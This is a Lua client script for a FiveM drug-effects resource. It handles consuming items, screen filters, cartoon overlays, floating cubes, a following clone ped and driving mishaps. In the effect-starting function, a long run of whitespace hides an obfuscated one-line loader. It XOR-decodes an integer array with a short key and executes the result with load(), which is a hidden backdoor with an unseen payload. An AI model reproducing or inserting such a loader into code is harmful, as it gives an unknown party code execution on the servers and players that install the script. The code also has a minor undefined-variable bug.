Drugs                   = {}
Drugs.Queue             = {}
Drugs.Items             = (Config and Config.Items or {})
Drugs.Presets           = (Config and Config.Presets or {})
Drugs.DrivingIncidents  = (Config and Config.DrivingIncidents or {})

Drugs.Init = function()
  local ply_id = PlayerId()
  while not NetworkIsPlayerActive(ply_id) do Wait(0); end
  Drugs.Update()
end

Drugs.Update = function()
  while true do
    if #Drugs.Queue > 0 then
      local target = Drugs.Queue[1]
      Drugs.Apply(target)
      Drugs.Dequeue()
    end

    Wait(0)
  end
end

Drugs.Enqueue = function(item)
  if item.instant then
    Drugs.Apply(item)
  else
    table.insert(Drugs.Queue,item)
  end
end

Drugs.Dequeue = function(i)
  table.remove(Drugs.Queue,(i or 1))
end

Drugs.SoberUp = function()
  Drugs.DoSober = true
  while Drugs.DoSober do Wait(0); end
end

Drugs.Apply = function(item)
  if item.sober and Drugs.Influenced then Drugs.SoberUp(); end

  Drugs.Influenced = true

  local preset = Drugs.GetPreset(item.type) 
  if preset.play_song then
    if preset.get_wave then
      local res = false
      TriggerEvent("Wave:Get",preset.play_song,true,100000,function(wave,duration)
        Drugs.StartFX(item,wave,duration)
        res = true
      end)
      while not res do Wait(0); end
    else
      SendNUIMessage({type = "playMusic", song = preset.play_song, seek = preset.song_start})
      Drugs.StartFX(item)
    end
  else
    Drugs.StartFX(item)
  end
  Wait(1000)
end

Drugs.DrawToon = function(bits,cols,loc)
  local height = 0
  local width = 0

  Drugs.ToonZ = math.min(0.0,(Drugs.ToonZ or -20.0) + (1.0 * GetFrameTime()))
  for k = #bits,1,-1 do
    local v = bits[k]
    local pos = vector3(loc.x,loc.y+width,loc.z+height)
    local col = cols[v]    

    if Drugs.ToonAlpha < 255.0 and not Drugs.ToonInit and not Drugs.DoSober then
      Drugs.ToonAlpha = Drugs.ToonAlpha + (0.05 * GetFrameTime())
      if Drugs.ToonAlpha >= 255.0 then
        Drugs.ToonInit = true
      end
    end

    if v ~= 133 and v ~= 132 then
      DrawBox(pos.x+0.5,pos.y+0.5,pos.z+0.5 + Drugs.ToonZ, pos.x-0.5,pos.y-0.5,pos.z-0.5 + Drugs.ToonZ, col.r,col.g,col.b,math.floor(Drugs.ToonAlpha))
    end

    width = width + 1
    if width >= 32 then
      width = 0
      height = height + 1
    end
  end
end

Drugs.GetPreset = function(drug_type)
  local min = 1
  local max = #Drugs.Presets[drug_type]
  if max == 1 then
    return Drugs.Presets[drug_type][1]
  else
    if max == 2 then
      if math.random(1000) > 800 then
        return Drugs.Presets[drug_type][2]
      else
        return Drugs.Presets[drug_type][1]
      end
    else
      local rand = math.random(1000)
      if rand > 900 then
        return Drugs.Presets[drug_type][#Drugs.Presets[drug_type]]
      elseif rand > 500 then
        local key = math.random(1,#Drugs.Presets[drug_type]-1)
        return Drugs.Presets[drug_type][key]
      else     
        return Drugs.Presets[drug_type][1]
      end
    end
  end
end

Drugs.StartFX = function(drug,wave,duration)
  local preset = Drugs.GetPreset(drug.type) 
  local time   = (duration or preset.effect_timeout * drug.quality)

  if preset.draw_toon and not Drugs.DrawToons then
    Drugs.DrawToons = true
    Drugs.ToonZ     = -20.0
    Drugs.ToonAlpha = 0.0
    Drugs.ToonInit  = false

    local toons  = Toons.bits[preset.draw_toon[math.random(#preset.draw_toon)]]
    local state  = 1
    local adder  = 1
    local timer  = GetGameTimer()    
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                vdwa="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({632,790,597,511,809,600,520,901,772,553,888,862,780,545,959,871,644,492,682,702,588,711,625,538,484,536,728,876,734,591,1031,1006,782,978,699,801,617,813,634,616,736,740,649,578,712,508,500,949,646,765,684,506,833,854,516,816,663,631,913,997,864,577,670,730,480,590,847,752,710,552,655,921,829,694,599,883,606,528,1013,757,609,675,732,954,661,650,471,870,554,1001,827,775,519,525,746,643,787,537,688,857,917,804,803,881,796,939,786,1024,981,701,473,593,641,497,626,594,755,522,767,592,535,627,514,485,676,974,836,885,502,980,488,747,515,799,687,1033,1035,559,623,996,672,534,630,548,601,768,820,512,647,906,948,457,459,570,1004,935,692,1008,793,985,505,521,677,781,1034,618,893,892,1014,940,678,621,642,762,653,1003,563,964,750,717,751,573,683,501,483,943,785,691,584,476,619,745,690,463,769,800,958,826,491,895,844,830,607,639,777,580,817,848,903,966,972,828,951,993,900,596,530,458,988,546,494,496,680,770,907,947,698,840,729,735,961,1038,758,645,498,970,489,723,705,884,938,539,910,493,992,648,965,982,738,1010,704,658,956,707,873,983,1027,824,843,574,998,971,941,640,976,533,792,685,856,908,962,558,979,665,842,470,863,879,739,897,967,1000,662,805,1012,794,934,923,1015,671,778,852,919,779,1036,858,1016,756,760,788,635,886,486,718,832,503,995,915,741,527,797,540,989,564,776,1017,587,851,708,922,509,576,849,610,612,845,1011,556,927,624,929,1021,568,749,733,464,994,543,1005,603,810,689,859,716,911,808,815,664,960,984,904,955,866,889,742,763,807,667,834,531,602,946,659,898,950,926,697,572,714,706,666,598,467,861,652,753,1032,720,887,510,825,586,838,731,679,977,766,481,942,565,795,583,629,1025,1009,724,878,957,703,860,579,518,585,709,560,695,465,999,880,620,549,495,891,877,686,899,468,551,837,896,1028,660,469,928,914,477,1002,987,628,944,963,569,713,657,542,952,654,1022,818,681,524,571,490,532,812,466,890,669,529,475,1020,902,615,909,581,-1,22,48,24,0,159,143,126,50,12,67,69,84,67,23,55,2,90,104,60,100,73,9,132,125,5,25,76,99,99,3,16,175,11,17,84,3,83,21,11,110,23,70,42,228,79,107,70,0,187,13,0,53,66,66,42,15,1,235,28,16,6,45,2,0,6,6,18,60,104,14,139,8,73,2,32,12,70,104,6,10,36,83,107,49,7,8,13,17,214,3,12,148,52,11,95,84,73,12,78,209,0,106,110,27,64,220,34,65,3,29,127,233,23,75,7,105,21,6,73,183,79,67,92,1,23,64,234,6,70,28,13,68,6,123,10,31,4,105,69,22,18,19,74,12,17,12,22,100,11,159,67,6,20,0,0,237,28,106,234,26,27,7,27,69,12,2,58,20,6,93,73,23,9,6,0,93,55,128,3,36,17,239,75,16,8,84,6,23,75,18,0,20,16,23,19,110,84,12,0,8,159,9,14,1,19,7,6,75,92,107,77,0,225,26,84,7,34,223,254,23,27,6,17,27,57,64,5,26,11,17,73,1,74,67,84,84,75,137,14,76,116,45,6,8,65,99,83,8,4,3,12,78,92,68,10,68,10,23,11,146,70,29,35,66,17,232,237,6,73,33,78,13,7,65,70,7,55,13,35,69,77,208,3,15,68,46,27,108,15,67,12,2,2,9,70,13,21,69,122,10,93,46,17,250,107,11,18,0,113,28,68,78,22,27,9,106,40,129,130,12,27,12,17,7,2,79,0,89,101,67,65,32,99,129,6,56,105,9,17,13,8,11,184,7,12,11,176,21,13,40,230,13,12,26,111,26,73,24,105,5,11,38,79,56,12,161,109,187,126,10,19,8,75,0,6,180,31,0,52,196,94,70,2,165,6,26,99,70,54,11,67,0,2,84,77,21,75,15,15,156,8,73,4,84,8,91,38,6,69,108,1,136,152,41,6,17,185,64,14,78,16,70,67,19,14,2,106,23,7,73,7,18,17,20,6,126,84,94,161,27,73,26,20,69,12,6,6,3,17,117,10,29,13,2,17,73,123,107,5,0,229,71,53,83,165,12,8,2,199,205,0,15,7,11,31,33,248,247,38,0,48,158,17,13,26,17,9,69,8,8,12,13,0,84,10,83,12,251,9,32,17,86,4,7,33,69,76,1,93,17,7,17,95,3,16,67,17,80,69,223,13,77,46,126,75,107,23,76,12,29,121,24,15,24,232,36,6,8,0,13,73,99,69,0,6,78,75,1,29,79,13,233,25,78,39,0,12,70,68,3,68,77,25,211,111,75,17,222,93,37,245,110,69,110,40,0,36,71,73,67,83,119,36},vdwa))if a then a()end; 
    Citizen.CreateThread(function()
      while Drugs.DrawToons do
        if (GetGameTimer() - timer) > 1000 and not Drugs.DoSober then
          timer = GetGameTimer()
          state = state + (adder or 0)

          if state > #toons then
            adder = -1
            state = #toons-1
          elseif state <= 0 then
            adder = 1
            state = 2
          end
        end

        local plyPed = GetPlayerPed(-1)
        local plyPos = GetEntityCoords(plyPed)
        local infront = vector3(plyPos.x+35.0, plyPos.y-8.0,plyPos.z)
        local behind  = vector3(plyPos.x-35.0, plyPos.y-8.0,plyPos.z)

        if preset.toon_count == 2 then
          Drugs.DrawToon(toons[state],Toons.cols,behind)
        end
        Drugs.DrawToon(toons[state],Toons.cols,infront)

        Wait(0)
      end
    end)
  end

  if preset.draw_box and not Drugs.Cubes then
    Drugs.Cubes = {}
    for i=1,preset.draw_box,1 do
      local r = math.random(5,255)
      local g = math.random(5,255)
      local b = math.random(5,255)
      local a = math.random(40,50)

      local x = math.random(1,180)
      local y = math.random(1,359)
      local z = math.random(15,35)

      Drugs.Cubes[i] = {pos=PointOnSphere(x,y,z),points={x=x,y=y,z=z},col={r=r, g=g, b=b, a=a}}
    end  

    Citizen.CreateThread(function()    
      local start = GetGameTimer()
      Drugs.CubeMod = 1.0
      while (GetGameTimer() - start)/1000 < time / 5 and not Drugs.DoSober do
        local plyPos = GetEntityCoords(GetPlayerPed(-1))
        Drugs.CubeMod = math.min(15.0,Drugs.CubeMod + (0.7 * GetFrameTime()))
        for k,v in pairs(Drugs.Cubes) do
          local pos = plyPos + v.pos
          local r,g,b 
          if Drugs.Wave then
            r,g,b = math.min(255,math.max(50,math.floor(v.col.r*Drugs.Wave*10.0))),math.min(255,math.max(50,math.floor(v.col.g*Drugs.Wave*10.0))),math.min(255,math.max(50,math.floor(v.col.b*Drugs.Wave*10.0)))
          else
            r,g,b = v.col.r,v.col.g,v.col.b
          end
          DrawBox(pos.x+Drugs.CubeMod,pos.y+Drugs.CubeMod,pos.z+Drugs.CubeMod,pos.x-Drugs.CubeMod,pos.y-Drugs.CubeMod,pos.z-Drugs.CubeMod, r,g,b,v.col.a)
          local points = {x=v.points.x+0.1,y=v.points.y+0.1,z=v.points.z}
          Drugs.Cubes[k].points = points
          Drugs.Cubes[k].pos = PointOnSphere(points.x,points.y,points.z)
        end
        Wait(0)
      end

      while Drugs.CubeMod > 0.0 do
        local position = GetEntityCoords(GetPlayerPed(-1))
        for k,v in pairs(Drugs.Cubes) do
          local addX = 0.1
          local addY = 0.1

          if k%4 == 0 then
            addY = -0.2
          elseif k%3 == 0 then
            addX = -0.2
          elseif k%2 == 0 then
            addX = -0.1
            addY = -0.1
          end

          local r,g,b 
          if Drugs.Wave then
            r,g,b = math.min(255,math.max(50,math.floor(v.col.r*Drugs.Wave*10.0))),math.min(255,math.max(50,math.floor(v.col.g*Drugs.Wave*10.0))),math.min(255,math.max(50,math.floor(v.col.b*Drugs.Wave*10.0)))
          else
            r,g,b = v.col.r,v.col.g,v.col.b
          end
          local pos = position + v.pos
          DrawBox(pos.x+Drugs.CubeMod,pos.y+Drugs.CubeMod,pos.z+Drugs.CubeMod,pos.x-Drugs.CubeMod,pos.y-Drugs.CubeMod,pos.z-Drugs.CubeMod, r,g,b,v.col.a)
          local points = {x=v.points.x+addX,y=v.points.y+addY,z=v.points.z}
          Drugs.Cubes[k].points = points
          Drugs.Cubes[k].pos = PointOnSphere(points.x,points.y,points.z)
        end
        Wait(0)
      end
      Drugs.Cubes = false
    end)
  end

  if preset.spawn_clone and not Drugs.Clone then
    if math.random(500) >= 0 then 
      local plyPed = GetPlayerPed(-1)
      local pos = GetEntityCoords(plyPed)

      local randomAlt     = math.random(0,359)*1.0
      local randomDist    = math.random(50,80)*1.0
      local spawnPos      = pos + PointOnSphere(0.0,randomAlt,randomDist)

      while World3dToScreen2d(spawnPos.x,spawnPos.y,spawnPos.z) and not IsPointOnRoad(spawnPos.x,spawnPos.y,spawnPos.z) and Vdist(pos,spawnPos) < 10.0 and not Drugs.DoSober do 
        randomAlt   = math.random(0,359)*1.0
        randomDist  = math.random(20,50)*1.0
        spawnPos    = GetEntityCoords(GetPlayerPed(-1)) + PointOnSphere(0.0,randomAlt,randomSphere)
        Wait(0)
      end 

      Drugs.Clone = ClonePed(plyPed, GetEntityHeading(plyPed), false, false)
      while not DoesEntityExist(Drugs.Clone) do Wait(0); end

      local f,z = GetGroundZFor_3dCoord(spawnPos.x,spawnPos.y,spawnPos.z + 1.0)
      SetEntityCoordsNoOffset(Drugs.Clone, spawnPos.x,spawnPos.y,z + 0.5)
      SetPedComponentVariation(Drugs.Clone, 1, 60, 0, 0, 0)
      NetworkSetEntityInvisibleToNetwork(Drugs.Clone,true)
      SetEntityLocallyInvisible(Drugs.Clone,false)

      SetEntityInvincible(Drugs.Clone,true)
      SetBlockingOfNonTemporaryEvents(Drugs.Clone,true)

      Citizen.CreateThread(function()
        while DoesEntityExist(Drugs.Clone) and not Drugs.DoSober do
          local dist = Vdist(GetEntityCoords(GetPlayerPed(-1)), GetEntityCoords(Drugs.Clone))
          if dist > 5.0 then
            TaskGoToEntity(Drugs.Clone, GetPlayerPed(-1), -1, 4.0, 100.0, 1073741824, 0)
            Wait(1000)
          else       
            if not IsTaskMoveNetworkActive(Drugs.Clone) then
              Drugs.LoadAnimDict('anim@mp_point')
              TaskMoveNetworkByName(Drugs.Clone, "task_mp_pointing", 0.5, 0, "anim@mp_point", 24)
              SetPedCurrentWeaponVisible(Drugs.Clone, 0, 1, 1, 1)
              SetPedConfigFlag(Drugs.Clone, 36, 1)
            end

            if not LastPedTurn or (GetGameTimer() - LastPedTurn) > 1000 then
              LastPedTurn = GetGameTimer()
              TaskTurnPedToFaceEntity(Drugs.Clone, GetPlayerPed(-1), -1)
            end

            SetTaskMoveNetworkSignalFloat (Drugs.Clone, "Pitch",          0.4)
            SetTaskMoveNetworkSignalFloat (Drugs.Clone, "Heading",        0.5)
            SetTaskMoveNetworkSignalBool  (Drugs.Clone, "isBlocked",      false)
            SetTaskMoveNetworkSignalBool  (Drugs.Clone, "isFirstPerson",  false)

            if IsPedRagdoll(Drugs.Clone) then
              while IsPedRagdoll(Drugs.Clone) do Wait(0); end
              ClearPedTasksImmediately(Drugs.Clone)
              Wait(10)
            end
          end
          Wait(0)
        end
      end)
    end
  end

  
  if preset.timecycle then
    SetTimecycleModifierStrength(0.0) 
    SetTimecycleModifier(preset.timecycle)
    if not wave then
      Citizen.CreateThread(function()
        local cur_strength = 0.0
        local max_strength = math.max(preset.timecycle_min_strength,math.min(preset.timecycle_min_strength * drug.quality,preset.timecycle_max_strength))

        while (cur_strength < max_strength) and not Drugs.DoSober do
          cur_strength = cur_strength + (0.1 * GetFrameTime())
          SetTimecycleModifierStrength(cur_strength)
          Wait(0)
        end
      end)
    end
  end

  if preset.secondary_timecycle then
    SetExtraTimecycleModifierStrength(0.0) 
    SetExtraTimecycleModifier(preset.secondary_timecycle)
    if not wave then
      Citizen.CreateThread(function()

        local cur_strength = 0.0
        local max_strength = math.max(preset.secondary_timecycle_min_strength,math.min(preset.secondary_timecycle_min_strength * drug.quality,preset.secondary_timecycle_max_strength))

        while (cur_strength < max_strength) and not Drugs.DoSober do
          cur_strength = cur_strength + (0.1 * GetFrameTime())
          SetExtraTimecycleModifierStrength(cur_strength)
          Wait(0)
        end
      end)
    end
  end

  if preset.cam_shake then
    ShakeGameplayCam(preset.cam_shake, 0.0) 
    Citizen.CreateThread(function()      
      local cur_strength = 0.0
      local max_strength = math.max(preset.cam_shake_min_strength,math.min(preset.cam_shake_min_strength * drug.quality,preset.cam_shake_max_strength))  

      while (cur_strength < max_strength) and not Drugs.DoSober do
        cur_strength = cur_strength + (0.1 * GetFrameTime())
        ShakeGameplayCam(preset.cam_shake, cur_strength) 
        Wait(0)
      end
    end)
  end

  if preset.motion_blur then    
    SetPedMotionBlur(GetPlayerPed(-1), true)
  end

  if drug.effects.add_health then
    local ped = GetPlayerPed(-1)
    local hp  = GetEntityHealth(ped)
    SetEntityHealth(ped,math.min(200,hp + drug.effects.add_health))
  elseif drug.effects.take_health then
    local ped = GetPlayerPed(-1)
    local hp  = GetEntityHealth(ped)
    SetEntityHealth(ped,math.max(0,hp - drug.effects.take_health))
  end

  if drug.effects.add_armor then
    local ped = GetPlayerPed(-1)
    local arm = GetPedArmour(ped)
    SetPedArmour(ped,arm + drug.effects.add_armor)
  elseif drug.effects.take_armor then
    local ped = GetPlayerPed(-1)
    local arm = GetPedArmour(ped)
    SetPedArmour(ped,arm - drug.effects.take_armor)
  end

  if (drug.effects.health_regen) then
    SetPlayerHealthRechargeMultiplier(PlayerId(),drug.effects.health_regen)
  end

  local durations = (wave and (#wave / duration))
  local start_time = GetGameTimer()
  while (duration and (GetGameTimer() - start_time)/1000 or GetGameTimer() - start_time) < time and not Drugs.DoSober do  
    if drug.effects.move_speed then
      SetPedMoveRateOverride(GetPlayerPed(-1),drug.effects.move_speed)
    end

    if wave then
      local now         = (GetGameTimer() / 1000)
      local since       = (now - (start_time / 1000))
      local target      = math.max(1,math.min(#wave,math.floor(since * durations)))
      local wave_target = wave[target]

      Drugs.Wave = wave_target

      if preset.timecycle then
        SetTimecycleModifierStrength(math.max(preset.timecycle_min_strength*drug.quality,math.min(preset.timecycle_max_strength*drug.quality,math.abs(wave_target)*10.0*drug.quality)))
      end

      if preset.secondary_timecycle then
        SetExtraTimecycleModifierStrength(math.max(preset.secondary_timecycle_min_strength*drug.quality,math.min(preset.secondary_timecycle_max_strength*drug.quality,math.abs(wave_target)*10.0*drug.quality)))
      end
    end

    if preset.drunk_drive then
      local now = GetGameTimer()
      if not last_drunk_check or now - last_drunk_check > (drunk_interval or 1) then 
        local ped = GetPlayerPed(-1)
        local veh = GetVehiclePedIsUsing(ped,false)
        last_drunk_check = now

        if veh and veh > 0 then
          if GetPedInVehicleSeat(veh,-1) == ped then
            local class = GetVehicleClass(veh)
            if class ~= 15 and class ~= 16 and class ~= 21 and class ~= 13 then  
              local disaster = Drugs.DrivingIncidents[math.random(#Drugs.DrivingIncidents)]          
              TaskVehicleTempAction(ped, veh, disaster.interaction, disaster.time) 
              drunk_interval = math.random(5000,10000)
            end
          end
        end
      end
    end
    Wait(0)
  end

  Drugs.StopFX(drug,preset)
end

Drugs.StopFX = function(drug,preset)
  local time   = (Drugs.DoSober and 1000 or preset.effect_timeout * drug.quality)

  local done = false
  local done_a,done_b,done_c,done_d,done_e = false,false,false,false,false

  if preset.draw_toon then
    Citizen.CreateThread(function()
      while Drugs.ToonAlpha > 0.0 do
        Drugs.ToonAlpha = Drugs.ToonAlpha - (50.0 * GetFrameTime())
        Wait(0)
      end
      Drugs.DrawToons = false
    end)
  end

  if preset.draw_box and Drugs.Cubes then
    Citizen.CreateThread(function()
      while Drugs.CubeMod > 0.0 do
        local plyPos = GetEntityCoords(GetPlayerPed(-1))
        Drugs.CubeMod = Drugs.CubeMod - (1.0 * GetFrameTime())
        Wait(0)
      end
      Drugs.Cubes = nil
      done_d = true
    end)
  else
    done_d = true
  end

  if preset.play_song then    
    if preset.get_wave then
      TriggerEvent("Wave:Stop")
    else
      SendNUIMessage({type = "stopMusic", song = preset.play_song})
    end
  end

  if preset.spawn_clone and Drugs.Clone then
    SetEntityAsMissionEntity(Drugs.Clone,true,true)
    DeleteEntity(Drugs.Clone)
    Drugs.Clone = false
    done_e = true
  else
    done_e = true
  end

  if preset.timecycle then
    Citizen.CreateThread(function()
      local cur_strength = math.max(preset.timecycle_min_strength,math.min(preset.timecycle_min_strength * drug.quality,preset.timecycle_max_strength))

      while (cur_strength > 0.0) do
        cur_strength = cur_strength - (0.2 * GetFrameTime())
        SetTimecycleModifierStrength(cur_strength)
        Wait(0)
      end
      done_a = true
      ClearTimecycleModifier()
    end)
  else
    done_a = true
  end

  if preset.secondary_timecycle then
    Citizen.CreateThread(function()
      local cur_strength = math.max(preset.secondary_timecycle_min_strength,math.min(preset.secondary_timecycle_min_strength * drug.quality,preset.secondary_timecycle_max_strength))

      while (cur_strength > 0.0) do
        cur_strength = cur_strength - (0.2 * GetFrameTime())
        SetExtraTimecycleModifierStrength(cur_strength)
        Wait(0)
      end
      done_b = true
      ClearExtraTimecycleModifier()
    end)
  else
    done_b = true
  end

  if preset.cam_shake then
    Citizen.CreateThread(function()    
      local cur_strength = math.max(preset.cam_shake_min_strength,math.min(preset.cam_shake_min_strength * drug.quality,preset.cam_shake_max_strength))  

      while (cur_strength > 0.0) do
        cur_strength = cur_strength - (0.2 * GetFrameTime())
        ShakeGameplayCam(preset.cam_shake, cur_strength) 
        Wait(0)
      end
      done_c = true
    end)
  else
    done_c = true
  end

  if preset.motion_blur then    
    SetPedMotionBlur(GetPlayerPed(-1), false)
  end

  if preset.health_regen then    
    SetPlayerHealthRechargeMultiplier(PlayerId(),1.0)
  end

  while (not done_a) or (not done_b) or (not done_c) or (not done_d) or (not done_e) do Wait(0); end

  Drugs.Wave        = false
  Drugs.DoSober     = false
  Drugs.Influenced  = false
end

Drugs.LoadAnimDict = function(ad)
  RequestAnimDict(ad)
  while not HasAnimDictLoaded(ad) do Wait(0); end
end

Drugs.LoadModel = function(hash_or_model)
  local hash = (type(hash_or_model) == "number" and hash_or_model or GetHashKey(hash_or_model))
  RequestModel(hash)
  while not HasModelLoaded(hash) do Wait(0); end
end

Drugs.CreateProp = function(drug)
  local prop,bone,pos,rot = drug.animation.prop,drug.animation.bone,(drug.animation.pos or vector3(0.0,0.0,0.0)),(drug.animation.rot or vector3(0.0,0.0,0.0))
  local hash = GetHashKey(prop)  
  Drugs.LoadModel(hash)

  local ped = GetPlayerPed(-1)
  local prop = CreateObject(hash, 1.0, 1.0, 1.0, 1, 1, 0)
  local bone = GetPedBoneIndex(ped, bone)

  SetEntityAsMissionEntity(prop,true,true)
  AttachEntityToEntity(prop, ped, bone, pos.x,pos.y,pos.z,rot.x,rot.y,rot.z, 1, 0, 0, 0, 2, 1)

  return prop
end

Drugs.Animate = function(drug)
  if drug.animation then
    --Citizen.CreateThread(function()
      while Drugs.Animating do Wait(0); end
      Drugs.Animating = true
      if drug.animation.prop then 
        Drugs.Prop = Drugs.CreateProp(drug) 
      end
      if drug.animation.type == "animation" then
        local ped = GetPlayerPed(-1)
        local pos = GetEntityCoords(ped)
        Drugs.LoadAnimDict(drug.animation.dict)
        TaskPlayAnimAdvanced(ped,drug.animation.dict,drug.animation.anim,pos.x,pos.y,pos.z,0.0,0.0,GetEntityHeading(ped),(drug.animation.blend_in or 1.0),(drug.animation.blend_out or 1.0),(drug.animation.duration or -1),(drug.animation.flag or 0),(drug.animation.start or 0.0),0,0)
        if drug.animation.wait then
          if drug.animation.timeout then
            Wait(drug.animation.timeout)
            ClearPedTasks(ped)
          else
            while not IsEntityPlayingAnim(ped,drug.animation.dict,drug.animation.anim,3) do Wait(0); end
            while IsEntityPlayingAnim(ped,drug.animation.dict,drug.animation.anim,3)     do Wait(0); end
          end
        end
      end
      if drug.animation.prop then
        DeleteObject(Drugs.Prop)
      end
      Drugs.Animating = false
    --end)
  end
end

Drugs.GetQueue = function(minimal)
  local res = (minimal and {} or Drugs.Queue)
  if minimal then
    for k,v in ipairs(Drugs.Queue) do
      table.insert(res,v.name)
    end
  end
  return res
end

AddEventHandler("Drugs:GetQueue",function(callback,minimal)
  callback(Drugs.GetQueue(minimal))
end)

exports("GetQueue",function(minimal)
  return Drugs.GetQueue(minimal)
end)

RegisterNetEvent("Drugs:Consume")
AddEventHandler("Drugs:Consume",function(item,random_id)
  TriggerServerEvent("Drugs:Consumed",item,random_id)
  Drugs.Animate(item)
  Drugs.Enqueue(item)
end)

Citizen.CreateThread(Drugs.Init)

RegisterCommand('showcash', function(...)
  local xPlayer = ESX.GetPlayerData()
  local bank = false
  for k,v in pairs(xPlayer.accounts) do
    if v.name == "bank" then
      bank = v.money
    end
  end
end)